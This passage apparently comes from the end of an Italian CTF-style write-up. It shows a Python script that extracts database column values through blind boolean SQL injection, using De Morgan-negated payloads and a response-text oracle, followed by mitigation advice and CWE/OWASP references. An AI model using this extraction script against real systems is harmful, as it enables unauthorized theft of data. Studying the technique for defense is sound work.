                name = bytes.fromhex(result[column]).decode('utf-8')
                result[column] = name
                msg += f'\n[{column}] {name}'
            except ValueError:
                print(f"Error while decoding hex name for table {table}")

        # Fase 3c: Trovo il valore di tutti i campi della tabella
        # Payload per estrarre i valori delle colonne in hex
        payload = f"?id=-1' OR NOT( NOT(id=3) OR NOT( (SELECT hex({{}}) FROM {choosen} LIMIT {{}}, 1) LIKE '{{}}%' ) ) OR '0"
        values = ['' for _ in range(columns)]  # Lista per valori
        msg = ''  # Non utilizzato qui
        
        for column in range(columns):  # Ciclo per colonna
            value = result[column]  # Nome della colonna corrente
            print(f"[*] Estrazione del valore '{value}'...")
            
            while True:  # Ciclo per costruire il valore
                char_found = False
                for c in dictionary:
                    query = payload.format(value, column, values[column] + c)  # Nota: format con tre parametri
                    response = requests.get(f'{url}{query}')
                    
                    if "One more day ..." in response.text:  # Match
                        values[column] += c
                        char_found = True
                        break 
                
                if not char_found:
                    break
                    
            # Decodifica hex
            try:
                name = bytes.fromhex(values[column]).decode('utf-8')
                values[column] = name
            except ValueError:
                print(f"Error while decoding hex name for table {table}")
        
        print(f'Values: {values}')  # Output finale dei valori estratti
```

Questo codice illustra l'implementazione pratica delle tecniche descritte, con commenti che evidenziano il legame tra logica matematica e esecuzione tecnica.

## Mitigazione / Fix proposto
Per prevenire questo tipo di attacco, lo sviluppatore avrebbe dovuto adottare **Prepared Statements** o **Parameterized Queries** utilizzando librerie come PDO in PHP. Questo separa completamente il codice SQL dai dati utente, rendendo impossibili le iniezioni.

Inoltre:
- Implementare una **whitelist** di input invece di blacklistare keyword.
- Utilizzare **escaping** appropriato, ma non come unica difesa.
- Applicare **Web Application Firewall** configurato correttamente per rilevare pattern di SQL injection, non solo keyword specifiche.

## Riferimenti
- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (Injection).
- **OWASP Top 10**: A03:2021 - Injection.
- **MITRE ATT&CK**: T1190 - Exploit Public-Facing Application.
- Leggi di De Morgan: Principio logico fondamentale per la trasformazione di espressioni booleane.
